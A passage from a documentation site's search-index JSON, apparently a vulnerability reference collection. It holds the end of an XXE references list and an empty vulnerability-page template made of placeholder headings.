July 2019 - Trenton Gordon Synacktiv - CVE-2019-8986: SOAP XXE in TIBCO JasperReports Server - 11-03-2019 - Julien SZLAMOWICZ, Sebastien DUDEK","title":"References"},{"location":"_template_vuln/","text":"Vulnerability Title Vulnerability description - reference Summary Tools Something Subentry 1 Subentry 2 Tools Tool 1 Tool 2 Something Quick explanation Exploit References Blog title - Author, Date","title":"Vulnerability Title"},{"location":"_template_vuln/#vulnerability-title","text":"Vulnerability description - reference","title":"Vulnerability Title"},{"location":"_template_vuln/#summary","text":"Tools Something Subentry 1 Subentry 2","title":"Summary"},{"location":"_template_vuln/#tools","text":"Tool 1 Tool 2","title":"Tools"},{"location":"_template_vuln/#something","text":"Quick explanation Exploit","title":"Something"},{"location":"_template_vuln/#references","text":"Blog title - Author, Date","title":"References"}]}